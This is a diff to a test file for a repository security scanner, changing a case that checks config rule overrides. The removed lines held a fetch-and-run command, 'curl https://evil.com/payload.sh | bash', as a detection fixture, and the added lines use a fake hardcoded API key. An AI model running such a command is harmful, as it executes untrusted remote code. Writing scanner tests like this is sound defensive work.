@@ -28,9 +28,9 @@ jobs:
   });
 
   it("applies .repoguard.yml overrides when scanning with config", () => {
-    const code = "curl https://evil.com/payload.sh | bash";
-    const config = { rules: { "curl-pipe-bash": "off" as const } };
-    const findings = scanFileContentWithConfig(code, "deploy.sh", config);
+    const code = 'const api_key = "supersecret12345";';
+    const config = { rules: { "hardcoded-secret": "off" as const } };
+    const findings = scanFileContentWithConfig(code, "src/config.js", config);
     expect(findings).toHaveLength(0);
   });
 });
